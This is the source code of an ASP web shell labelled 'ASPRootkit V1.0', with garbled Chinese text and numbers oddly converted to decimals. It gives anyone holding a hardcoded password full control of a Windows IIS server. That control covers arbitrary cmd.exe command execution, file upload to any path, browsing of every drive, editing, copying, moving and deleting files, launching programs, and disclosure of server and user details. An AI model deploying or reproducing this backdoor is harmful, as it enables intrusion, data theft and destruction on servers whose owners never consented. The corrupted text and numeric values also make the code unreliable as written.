
   <Script Language=VB runat=Server>
   Dim LANGUAGE , codepage , Data_5xsoft , objForm , objFile , Version , FormName , FileName , FilePath , FileSize
   Dim FileType , FileStart , upload , formPath , iCount , url
   </Script>
   <%@ LANGUAGE="VBSCRIPT"  codepage ="936" %>
   <title>¡Ë ASPRootkit£¨asp.net×¨°æ£©V1.0 -- by ÎÞÑÔ ¡Ë</title>
   <style>
   body{ SCROLLBAR-FACE-COLOR: #719BC5; FONT-SIZE: 12px; SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #ffffff; SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ffffff; FONT-FAMILY: "ËÎÌå"; SCROLLBAR-DARKSHADOW-COLOR: #ffffff
    font-family: ËÎÌå;   font-size: 9pt}
   table{ font-family: ËÎÌå; font-size: 9pt }
   a{ font-family: ËÎÌå; font-size: 9pt; color: #000000; text-decoration: none }
   a:hover{ font-family: ËÎÌå; color: #FF0000; text-decoration: none }
   input { BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
   </style>
   <% If request("UP")=1 Then %>
   <%Server.ScriptTimeOut=5000%>
   <SCRIPT RUNAT=SERVER (LANGUAGE)=VBSCRIPT>


   Class upload_5xsoft





   Public
   <Script Language=VB runat=Server>
   Function Form(strForm)
   strForm=lcase(strForm)
   If Not objForm.exists(strForm) Then
   Form=""
   else
   Form=objForm(strForm)
   End If
   End Function
   </script>


   Public
   <Script Language=VB runat=Server>
   Function File1(strFile)
   strFile=lcase(strFile)
   If Not objFile.exists(strFile) Then
   File1=new FileInfo
   else
   File1=objFile(strFile)
   End If
   End Function
   </script>


   Private
   <Script Language=VB runat=Server>
   Sub Class_Initialize
   dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
   dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
   dim iFindStart,iFindEnd
   dim iFormStart,iFormEnd,sFormName
   objForm=Server.CreateObject("Scripting.Dictionary")
   objFile=Server.CreateObject("Scripting.Dictionary")
   If Request.TotalBytes<1 Then Exit Sub
   tStream = Server.CreateObject("adodb.stream")
   Data_5xsoft = Server.CreateObject("adodb.stream")
   Data_5xsoft.Type = 1
   Data_5xsoft.Mode =3
   Data_5xsoft.Open
   Data_5xsoft.Write  (Request.BinaryRead(Request.TotalBytes))
   Data_5xsoft.Position=0
   RequestData =Data_5xsoft.Read
   iFormStart = 1
   iFormEnd = LenB(RequestData)



   vbCrlf = chrB(13.0) & chrB(10.0)
   sStart = MidB(RequestData,1.0, InStrB(iFormStart,RequestData,vbCrlf)-1.0)
   iStart = LenB (sStart)
   iFormStart=iFormStart+iStart+1.0
   while (iFormStart + 10.0) < iFormEnd
   iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3.0
   tStream.Type = 1.0
   tStream.Mode =3.0
   tStream.Open
   Data_5xsoft.Position = iFormStart
   Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
   tStream.Position = 0.0
   tStream.Type = 2.0
   tStream.Charset ="gb2312"
   sInfo = tStream.ReadText
   tStream.Close
   iFormStart = InStrB(iInfoEnd,RequestData,sStart)
   iFindStart = InStr(22.0,sInfo,"name=""",1.0)+6.0
   iFindEnd = InStr(iFindStart,sInfo,"""",1.0)
   sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
   if InStr (45.0,sInfo,"filename=""",1.0) > 0.0 then
   set theFile=new FileInfo
   iFindStart = InStr(iFindEnd,sInfo,"filename=""",1.0)+10.0
   iFindEnd = InStr(iFindStart,sInfo,"""",1.0)
   sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileName=getFileName(sFileName)
   theFile.FilePath=getFilePath(sFileName)
   iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1.0)+14.0
   iFindEnd = InStr(iFindStart,sInfo,vbCr)
   theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileStart =iInfoEnd
   theFile.FileSize = iFormStart -iInfoEnd -3.0
   theFile.FormName=sFormName
   if not objFile.Exists(sFormName) then
   objFile.add sFormName,theFile
   end if
   else
   tStream.Type =1.0
   tStream.Mode =3.0
   tStream.Open
   Data_5xsoft.Position = iInfoEnd
   Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3.0
   tStream.Position = 0.0
   tStream.Type = 2.0
   tStream.Charset ="gb2312"
   sFormValue = tStream.ReadText
   tStream.Close
   if objForm.Exists(sFormName) then
   objForm(sFormName)=objForm(sFormName)&", "&sFormValue
   else
   objForm.Add sFormName,sFormValue
   end if
   end if
   iFormStart=iFormStart+iStart+1.0
   wend
   RequestData=""
   set tStream =nothing
   End Sub
   Private Sub Class_Terminate
   if Request.TotalBytes>0.0 then
   objForm.RemoveAll
   objFile.RemoveAll
   set objForm=nothing
   set objFile=nothing
   Data_5xsoft.Close
   set Data_5xsoft =nothing
   end if
   End Sub
   Private function GetFilePath(FullPath)
   If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
   Else
   GetFilePath = ""
   End If
   End  function
   Private function GetFileName(FullPath)
   If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1.0)
   Else
   GetFileName = ""
   End If
   End  function
   End Class
   Class FileInfo
   dim FormName,FileName,FilePath,FileSize,FileType,FileStart
   Private Sub Class_Initialize
   FileName = ""
   FilePath = ""
   FileSize = 0.0
   FileStart= 0.0
   FormName = ""
   FileType = ""
   End Sub
   Public function SaveAs(FullPath)
   dim dr,ErrorChar,i
   SaveAs=true
   if trim(fullpath)="" or FileStart=0.0 or FileName="" or right(fullpath,1.0)="/" then exit function
   set dr=CreateObject("Adodb.Stream")
   dr.Mode=3.0
   dr.Type=1.0
   dr.Open
   Data_5xsoft.position=FileStart
   Data_5xsoft.copyto dr,FileSize
   dr.SaveToFile FullPath,2.0
   dr.Close
   set dr=nothing
   SaveAs=false
   end function
   End Class
   </SCRIPT>
   <%
   dim upload,file,formName,formPath,iCount
   set upload=new upload_5xsoft
   if upload.form("filepath")="" then
   response.write "ÇëÊäÈëÒªÉÏ´«ÖÁµÄÄ¿Â¼!"
   set upload=nothing
   response.end
   else
   formPath=upload.form("filepath")
   if right(formPath,1.0)<>"/" then formPath=formPath&"/"
   end if
   iCount=0.0
   for each formName in upload.objForm
   next
   response.write "<br>"
   for each formName in upload.objFile
   set file=upload.file(formName)
   if file.FileSize>0.0 then
   file.SaveAs Server.mappath(formPath&file.FileName)
   response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" ÉÏ´«³É¹¦!</center><br>"
   iCount=iCount+1.0
   end if
   set file=nothing
   next
   set upload=nothing
   response.write "<center>"&iCount&"¸öÎÄ¼þÉÏ´«½áÊø!</center>"
   response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>·µ»ØÉÏÒ»Ò³</font></a></center>"
   else
   url= Request.ServerVariables("URL")
   'ÐÞ¸ÄÏÂÃæµÄwww.96cn.com ¸ÄÎªÄãµÄÃÜÂë
   if trim(request.form("password"))="www.96cn.com" then
   response.cookies("password")="allen"
   response.redirect ""&url&""
   else if Request.Cookies("password")<>"allen" then
   call login()
   response.end
   end if
   select case request("id")
   case "edit"
   call edit()
   case "upload"
   call upload()
   case "dir"
   call dir()
   case else
   call main()
   end select
   end if
   sub login()
   for i=0.0 to 25.0
   on error resume next
   IsObj=false
   VerObj=""
   dim TestObj
   set TestObj=server.CreateObject(ObjTotest(i,0.0))
   If -2.147221005E9 <> Err then
   IsObj = True
   VerObj = TestObj.version
   if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
   end if
   ObjTotest(i,2.0)=IsObj
   ObjTotest(i,3.0)=VerObj
   next
   %>
   <body><center>
   <table border=0.0 width=500.0 cellspacing=0.0 cellpadding=0.0 bgcolor="#719BC5" style="border-collapse: collapse" bordercolor="#111111">
   <tr><td bgcolor="#FFFFFF">
   <table border=1.0 width=100.0% cellspacing=0.0 cellpadding=0.0 bordercolor="#719BC5" style="border-collapse: collapse">
   <caption>
   <p align="left">
      <font color="#84.0B8E"><font color="#084B8E"><b>ASPRootkit</b>£¨asp.net×¨°æ£©<b> V1.0 </b>-- by
      </font>
      <a target="_blank" style="color: #84.0B8E" href="http://www.96cn.com">
      <font color="#084B8E">ÎÞÑÔ</font></a></font></p>
   </caption>
   <tr bgcolor="#EEEEEE" height=18.0>
   <td width="59.0%" align=left bgcolor="#719BC5"><font color="#FFFFFF">&nbsp;·þÎñÆ÷Ãû</font></td>
   <td width="41.0%" bgcolor="#719BC5"><font color="#FFFFFF">&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></font></td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;·þÎñÆ÷IP</td>
   <td bgcolor="#DEE8F2">&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;·þÎñÆ÷¶Ë¿Ú</td>
   <td bgcolor="#DEE8F2">&nbsp;<%=Request.ServerVariables("SERVER_PORT")%></td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;·þÎñÆ÷Ê±¼ä</td>
   <td bgcolor="#DEE8F2">&nbsp;<%=now%></td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;±¾ÎÄ¼þ¾ø¶ÔÂ·¾¶</td>
   <td bgcolor="#DEE8F2">&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;·þÎñÆ÷CPUÊýÁ¿</td>
   <td bgcolor="#DEE8F2">&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> ¸ö</td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;·þÎñÆ÷²Ù×÷ÏµÍ³</td>
   <td bgcolor="#DEE8F2">&nbsp;<%=Request.ServerVariables("OS")%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18.0>
   <td align=left bgcolor="#719BC5"><font class=fonts color="#FFFFFF">&nbsp;·þÎñÆ÷ÔËËãËÙ¶È²âÊÔ</font></td>
   <td bgcolor="#719BC5"><font color="#FFFFFF">&nbsp;Íê³ÉÊ±¼ä</font></td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;ÎÞÑÔµÄµçÄÔ£¨256.0M,1700.0Hz£©</td>
   <td bgcolor="#DEE8F2">&nbsp;359.3 ºÁÃë</td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;ÖÐ¹úÆµµÀÐéÄâÖ÷»ú£¨2002.0-8.0-6.0£©</td>
   <td bgcolor="#DEE8F2">&nbsp;610.9 ºÁÃë</td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0>
   <td align=left bgcolor="#DEE8F2">&nbsp;Î÷²¿ÊýÂëwest263Ö÷»ú£¨2002.0-8.0-6.0£©</td>
   <td bgcolor="#DEE8F2">&nbsp;357.8 ºÁÃë</td>
   </tr>
   <tr bgcolor="#FFFFFF" height=18.0><%
   dim t1,t2,lsabc,thetime
   t1=timer
   for i=1.0 to 500000.0
   lsabc= 1.0 + 1.0
   next
   t2=timer
   thetime=cstr(int(( (t2-t1)*10000.0 )+0.5)/10.0)
   %><td align=left bgcolor="#DEE8F2"><font color=red>&nbsp;ÄúÕýÔÚÊ¹ÓÃµÄÕâÌ¨·þÎñÆ÷</font>&nbsp;</td>
   <td bgcolor="#DEE8F2">&nbsp;<font color=red><%=thetime%> ºÁÃë</font></td>
   </tr>
   </table>
   </td>
   </tr>
   </table>
   <html>
   <body><center>
   <table>
   <br>
   <%response.write "<font class=fonts>Ã¿´ÎÖ»ÄÜÖ´ÐÐÒ»¸ö²Ù×÷£º£©ÔÚ±¾Ò³²Ù×÷ÎÞÐëFSOÖ§³Ö£¡& Ä¿Ç°·þÎñÆ÷Ê±¼ä£º</font>" %>
   <%response.write now()%><BR>
   <form action="<%= Request.ServerVariables("URL") %>" method="POST">
   <font color="#084B8E">ä¯ÀÀ£º<input type=text name=text value="<%=szCMD %>" size="20.0" style="border: 1.0px solid #084B8E; ">  <font class=fonts>ÊäÈëÒªä¯ÀÀµÄÄ¿Â¼,×îºóÒª¼Ó\</font><br>
   ÎÄ¼þ£º<input type=text name=text1 value="<%=szCMD1 %>" size="20.0" style="border: 1.0px solid #084B8E; ">
   ¸´ÖÆ£º
   <input type=text name=text2 value="<%=szCMD2 %>" size="20.0" style="border: 1.0px solid #084B8E; "><br>
   ÎÄ¼þ£º<input type=text name=text3 value="<%=szCMD3 %>" size="20.0" style="border: 1.0px solid #084B8E; ">
   ÒÆ¶¯£º
   <input type=text name=text4 value="<%=szCMD4 %>" size="20.0" style="border: 1.0px solid #084B8E; "><br>
   Â·¾¶£º<input type=text name=text5 value="<%=szCMD5 %>" size="20.0" style="border: 1.0px solid #084B8E; ">
   ³ÌÐò£º
   <input type=text name=text6 value="<%=szCMD6 %>" size="20.0" style="border: 1.0px solid #084B8E; "><br>
   Ö´ÐÐ£º<input type=submit name=sb value=·¢ËÍÃüÁî class=input style="color: #084B8E; border: 1.0px solid #084B8E; background-color: #DEE8F2">
   </font>
   </form>
   </table>
   </center>
   </body>
   </html>
   <%
   szCMD = Request.Form("text")   'Ä¿Â¼ä¯ÀÀ
   if (szCMD <> "")  then
   set shell=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell.namespace(szcmd)
   set foditems=fod1.items
   for each co in foditems
   response.write "<font color=red>" & co.path & "-----" & co.size & "</font><br>"
   next
   end if
   %>

   <%
   szCMD1 = Request.Form("text1")  'Ä¿Â¼¿½±´£¬²»ÄÜ½øÐÐÎÄ¼þ¿½±´
   szCMD2 = Request.Form("text2")
   if szcmd1<>"" and szcmd2<>"" then
   set shell1=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell1.namespace(szcmd2)
   for i=len(szcmd1) to 1.0 step -1.0
   if mid(szcmd1,i,1.0)="\" then
      path=left(szcmd1,i-1.0)
      exit for
   end if
   next
   if len(path)=2.0 then path=path & "\"
   path2=right(szcmd1,len(szcmd1)-i)
   set fod2=shell1.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.copyhere foditem
   response.write "command completed success!"
   end if
   %>

   <%
   szCMD3 = Request.Form("text3")   'Ä¿Â¼ÒÆ¶¯
   szCMD4 = Request.Form("text4")
   if szcmd3<>"" and szcmd4<>"" then
   set shell2=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell2.namespace(szcmd4)

   for i=len(szcmd3) to 1.0 step -1.0
   if mid(szcmd3,i,1.0)="\" then
      path=left(szcmd3,i-1.0)
      exit for
   end if
   next

   if len(path)=2.0 then path=path & "\"
   path2=right(szcmd3,len(szcmd3)-i)
   set fod2=shell2.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.movehere foditem
   response.write "command completed success!"
   end if
   %>
   <%
   szCMD5 = Request.Form("text5")    'Ö´ÐÐ³ÌÐòÒªÖ¸¶¨Â·¾¶
   szCMD6 = Request.Form("text6")
   if szcmd5<>"" and szcmd6<>"" then
   set shell3=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   shell3.namespace(szcmd5).items.item(szcmd6).invokeverb
   response.write "command completed success!"
   end if
   %>


   <form method="POST" action=""&url&"">
   <font color="#084B8E">Enter Administrator Password £º</font><input type="password" name="password"size="24.0" style="border: 1.0px solid #084B8E; background-color: #DEE8F2">&nbsp;
   <input type="submit" value="LOGIN" style="color: #FFFFFF; letter-spacing: 5.0; border: 1.0px solid #084B8E; background-color: #719BC5">
   </center></form>
   </body>
   <%end sub%>
   <%sub main()
   'ÐÞ¸ÄÏÂÃæµÄurlpath¸ÄÎªÄã·þÎñÆ÷µÄÊµ¼ÊURL
   urlpath="http://localhost"
   dim cpath,lpath
   set fsoBrowse=CreateObject("Scripting.FileSystemObject")
   if Request("path")="" then
   lpath="/"
   else
   lpath=Request("path")&"/"
   end if
   if Request("attrib")="true" then
   cpath=lpath
   attrib="true"
   else
   cpath=Server.MapPath(lpath)
   attrib=""
   end if
   %><html>
   <script language="JavaScript">
   function crfile(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
   return false;
   }
   function crdir(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
   return false;
   }
   </script>
   <script language="vbscript">
   sub rmdir(ls)
   if confirm("ÄãÕæµÄÒªÉ¾³ýÕâ¸öÄ¿Â¼Âð!"&Chr(13.0)&Chr(10.0)&"Ä¿Â¼Îª£º"&ls)   then
   window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
   end if
   end sub
   sub copyfile(sfile)
   dfile=InputBox(""&Chr(13.0)&Chr(10.0)&"Ô´ÎÄ¼þ£º"&sfile&Chr(13.0)&Chr(10.0)&"ÇëÊäÈëÄ¿±êÎÄ¼þµÄÎÄ¼þÃû:"&Chr(13.0)&Chr(10.0)&"Ðí´øÂ·¾¶,Òª¸ù¾ÝÄãµÄµ±Ç°Â·¾¶Ä£Ê½. ×¢Òâ:¾ø¶ÔÂ·¾¶Ê¾Àýc:/»òc:\¶¼¿ÉÒÔ")
   dfile=trim(dfile)
   attrib="<%=request("attrib")%>"
   if dfile<>"" then
   if InStr(dfile,":") or InStr(dfile,"/")=1.0 then
   lp=""
   if InStr(dfile,":") and attrib<>"true" then
   alert "¶Ô²»Æð£¬ÄãÔÚÏà¶ÔÂ·¾¶Ä£Ê½ÏÂ²»ÄÜÊ¹ÓÃ¾ø¶ÔÂ·¾¶"&Chr(13.0)&Chr(10.0)&"´íÎóÂ·¾¶£º["&dfile&"]"
   exit sub
   end if
   else
   lp="<%=lpath%>"
   end if
   window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
   else
   alert"ÄúÃ»ÓÐÊäÈëÎÄ¼þÃû£¡"
   end If
   end sub
   </script><body bgcolor="#FFFFFF">
   <SCRIPT language="JavaScript">

   <!--


   function closeclk() {

   another=close();

   }

   //-->

   </SCRIPT>
   <div align="center">
     <center>
   <TABLE cellSpacing=0.0 cellPadding=3.0 width="750.0"
   bgColor=#DEE8F2 border=1.0 style="border-collapse: collapse" bordercolor="#719BC5">
   <caption>
   <p align="left">
      <font color="#84.0B8E"><font color="#084B8E"><b>ASPRootkit</b>£¨asp.net×¨°æ£©<b> V1.0 </b>-- by
      </font>
      <a target="_blank" href="http://www.96cn.com"><font color="#084B8E">ÎÞÑÔ</font><font color="#FFFFFF">--<span style="letter-spacing: 1.0">-</span>-<b><span style="letter-spacing: 1.0">---</span>------------<font size="3.0">--</font><span style="letter-spacing: 1.0">-----</span>-----<font size="3.0">--</font>----<span style="letter-spacing: 1.0">-</span>---------------------</b></font><font color="#84.0B8E"><INPUT TYPE="button" NAME="close" value="¹Ø±ÕÏµÍ³" onClick="closeclk()" style="color: #084B8E; border: 1.0px solid #084B8E; background-color: #DEE8F2"></font></a></font></p>
   </caption>
   <TBODY>
   <TR >
   <TD
   height=22.0 colspan="4.0" bgcolor="#719BC5" ><font color="#FFFFFF">ÇÐ»»ÅÌ·û£º</font><font color="#719BC5">£º</font><font color="#FFFFFF">
   <%
   For Each thing in fsoBrowse.Drives
   Response.write "<a href='"&url&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"ÅÌ:</a>          "
   NEXT
   %>   &nbsp;±¾»ú¾ÖÓòÍøµØÖ·£º
   <%
   Set oScript = Server.CreateObject("WSCRIPT.SHELL")
   Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
   Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
   %><%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %> </font>  </TD>
   </TR>  <TD colspan="4.0" bgcolor="#E2E7F3" ><%
   if Request("attrib")="true"  then
   response.write "<a href='"&url&"'><font color='#D00000'>µã»÷ÇÐ»»µ½Ïà¶ÔÂ·¾¶±à¼Ä£Ê½</font></a>"
   else
   response.write "<a href='"&url&"?attrib=true'><font color='#D00000'>µã»÷ÇÐ»»µ½¾ø¶ÔÂ·¾¶±à¼Ä£Ê½</font></a>"
   end if
   %><font color="#E2E7F3">£º</font>¾ø¶ÔÂ·¾¶: <%=cpath%>  &nbsp;&nbsp;µ±Ç°ä¯ÀÀÄ¿Â¼:<%=lpath%></TD></TR> <TR>
   <TD height=22.0 colspan="4.0" bgcolor="#719BC5" >
   <form name="form1" method="post" action="<%=url%>" >
   <input type="hidden" name="attrib" value="true">
   <font color="#FFFFFF">ä¯ÀÀÄ¿Â¼:
   <input type="text" name="path" size="35.0" value="c:" style="border: 1.0px solid #084B8E; ">
   <input type="submit" name="Submit" value="ä¯ÀÀÄ¿Â¼" style="color: #084B8E; border: 1.0px solid #084B8E; " > ¡¼ÇëÊ¹ÓÃ¾ø¶ÔÂ·¾¶,Ö§³Ö¾ÖÓòÍøµØÖ·£¡¡½
   </font>
   </TD></form>
   </TR><TR >
   <TD colspan="4.0" bgcolor="#E2E7F3" ><form name="form1" method="post" action="<%=url%>?up=1.0" enctype="multipart/form-data" >
   <input type="hidden" name="act" value="upload">
   ÉÏ´«µ½:
   <input name="filepath" type="text" value="/" size="5.0" style="border: 1px solid #084B8E">
   ÎÄ¼þµØÖ·:
   <input type="file" name="file1" value="" size="20.0" style="border: 1.0px solid #084B8E; background-color:#E2E7F3">&nbsp;
   <input type="submit" name="Submit" value="ÉÏ´«ÎÄ¼þ" style="color: #084B8E; border: 1.0px solid #084B8E; background-color: #E2E7F3" >&nbsp; ¡¼ÇëÊ¹ÓÃÏà¶ÔÂ·¾¶£¡¡½
   </TD>
   </form></TR>
   <TR bgcolor="#eeeeee">
   <TD colspan="4.0" bgcolor="#719BC5" >
   <%
   On Error Resume Next
   Set oScript = Server.CreateObject("WSCRIPT.SHELL")
   Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
   Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
   szCMD = Request.Form(".CMD")
   If (szCMD <> "") Then
   szTempFile = "C:\" & oFileSys.GetTempName( )
   Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0.0, True)
   Set oFile = oFileSys.OpenTextFile (szTempFile, 1.0, False, 0.0)
   End If%><font color="#FFFFFF"> </font>
   <FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
   <font color="#FFFFFF">
   <input type=text name=".CMD" size=45.0 value="<%= szCMD %>" style="border: 1.0px solid #084B8E; ">
   <input type=submit value="Ö´ÐÐ³ÌÐò" style="color: #084B8E; border: 1.0px solid #084B8E; " >  ¡¼ÇëÊ¹ÓÃ¾ø¶ÔÂ·¾¶£¬²¢ÇÒÈ·¶¨ÄãÓÐÏàÓ¦È¨ÏÞ£¡¡½
   <% If (IsObject(oFile)) Then
   On Error Resume Next
   Response.Write Server.HTMLEncode(oFile.ReadAll)
   oFile.Close
   Call oFileSys.DeleteFile(szTempFile, True)
   End If %> </font>
   </TD> </FORM></TR>
   <TR bgColor=#ffffff>
   <TD height=22.0 colspan="4.0" ><form name="newfile"
   onSubmit="return crfile(newfile.filename.value);">
   <input type="text" name="filename" size="45.0" style="border: 1.0px solid #084B8E; ">
   <input type="submit" value="ÐÂ½¨ÎÄ¼þ" style="color: #FFFFFF; border: 1.0px solid #084B8E; background-color: #719BC5" >&nbsp;
   <input type="button" value="ÐÂ½¨Ä¿Â¼"onclick="crdir(newfile.filename.value)" style="color: #084B8E; border: 1.0px solid #084B8E; background-color: #E2E7F3"><font color="#84.0B8E">&nbsp;
   <font color="#084B8E">¡¼ÐÂ½¨ÎÄ¼þºÍÐÂ½¨Ä¿Â¼²»ÄÜÍ¬Ãû¡½ </font>
   </font>
   </TD></form>
   </TR>
   <TR>
   <TD height=22.0 width="26.0%" rowspan="2.0" valign="top" bgColor=#E2E7F3 >
   <%
   dim theFolder,theSubFolders
   if fsoBrowse.FolderExists(cpath)then
   Set theFolder=fsoBrowse.GetFolder(cpath)
   Set theSubFolders=theFolder.SubFolders
   Response.write"<a href='"&url&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#719BC5'>¡ö</font>¡ü<font color='ff2222'>»ØÉÏ¼¶Ä¿Â¼</font></a><br>"
   For Each x In theSubFolders
   Response.write"<a href='"&url&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>©¸<font color='#719BC5'>¡ö</font>  "&x.Name&"</a> <a href="&chr(34.0)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34.0)&"><font color='#FF8000' >¡Á</font>É¾³ý</a><br>"
   Next
   end if
   %>
   </TD>
   <TD  width="45.0%"  bgColor=#E2E7F3>ÎÄ¼þÃû £¨Êó±êÒÆµ½ÎÄ¼þÃû¿ÉÒÔ²é¿´¸øÎÄ¼þµÄÊôÐÔ£©</TD>
   <TD width="11.0%" bgColor=#E2E7F3>´óÐ¡£¨×Ö½Ú£©</TD>
   <TD width="18.0%" bgColor=#E2E7F3>ÎÄ¼þ²Ù×÷</TD>
   </TR>
   <TR>
   <TD height=200.0 colspan="3.0" valign="top" bgColor=#ffffff>
   <%
   dim theFiles
   if fsoBrowse.FolderExists(cpath)then
   Set theFolder=fsoBrowse.GetFolder(cpath)
   Set theFiles=theFolder.Files
   Response.write"<table border='0.0' width='100.0%' cellpadding='0.0'>"
   For Each x In theFiles
   if Request("attrib")="true" then
   showstring="<strong>"&x.Name&"</strong>"
   else
   showstring="<a href='"&urlpath&lpath&x.Name&"' title='"&"ÀàÐÍ"&x.type&chr(10.0)&"ÊôÐÔ"&x.Attributes&chr(10.0)&"Ê±¼ä£º"&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
   end if
   Response.write"<tr><td width='50.0%'><font color='#084B8E'>¡õ</font>"&showstring&"</td><td width='8.0%'>"&x.size&"</a></td><td width='20.0%'><a href='"&url&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' > &nbsp;±à¼</a><a href='"&url&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank' >&nbsp;&nbsp;É¾³ý</a><a href='#' onclick=copyfile('"&lpath&x.Name&"')>&nbsp;&nbsp;¸´ÖÆ</a></td></tr>"
   Next
   end if
   Response.write"</table>"
   %>
   </TD>
   </TR></TBODY>
   </TABLE>
     </center>
   </div>
   <% end sub
   sub edit()
   if request("op")="del"  then
   if Request("attrib")="true" then
   whichfile=Request("path")
   else
   whichfile=server.mappath(Request("path"))
   end if
   Set fs = CreateObject("Scripting.FileSystemObject")
   Set thisfile = fs.GetFile(whichfile)
   thisfile.Delete True
   Response.write "<br><center>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û.</center>"
   else
   if request("op")="copy" then
   if Request("attrib")="true" then
   whichfile=Request("path")
   dsfile=Request("dpath")
   else
   whichfile=server.mappath(Request("path"))
   dsfile=Server.MapPath(Request("dpath"))
   end if
   Set fs = CreateObject("Scripting.FileSystemObject")
   Set thisfile = fs.GetFile(whichfile)
   thisfile.copy dsfile
   Response.write "<center><p>Ô´ÎÄ¼þ£º"+whichfile+"</center>"
   Response.write "<center><br>Ä¿µÄÎÄ¼þ£º"+dsfile+"</center>"
   Response.write "<center><br>¸´ÖÆ³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</p></center>"
   else
   if request.form("text")="" then
   if Request("creat")<>"yes" then
   if Request("attrib")="true" then
   whichfile=Request("path")
   else
   whichfile=server.mappath(Request("path"))
   end if
   Set fs = CreateObject("Scripting.FileSystemObject")
   Set thisfile = fs.OpenTextFile(whichfile, 1.0, False)
   counter=0.0
   thisline=thisfile.readall
   thisfile.Close
   set fs=nothing
   end if
   %>
   <form method="POST" action=""&url&"?id=edit">
   <input type="hidden" name="attrib" value="<%=Request("attrib")%>">
   <br>
   <div align="center">
     <center>
   <TABLE cellSpacing=0.0 cellPadding=3.0 width="750.0"
   bgColor=#b8b8b8 border=1.0 bordercolor="#719BC5" style="border-collapse: collapse">
   <TBODY>
   <TR >
   <TD
   height=22.0 bgcolor="#719BC5" bordercolor="#719.0BC5" ><div align="center">
      <font color="#FFFFFF"><b>ASPRootkit</b>(asp.net×¨°æ)<b> V1.0 -- by ÎÞÑÔ&nbsp; ¡¾ÎÄ¼þ±à¼Æ÷¡¿</b></font></div></TD>
   </TR>
   <TR >
   <TD width="100.0%"
   height=22.0 bgcolor="#ffffff" ><font color="#084B8E">ÎÄ¼þÃû£º</font>
   <input type="text" name="path" size="45.0"
   value="<%=Request("path")%>"readonly style="border: 1.0px solid #84.0B8E">
   </TD>
   </TR>
   <TR>
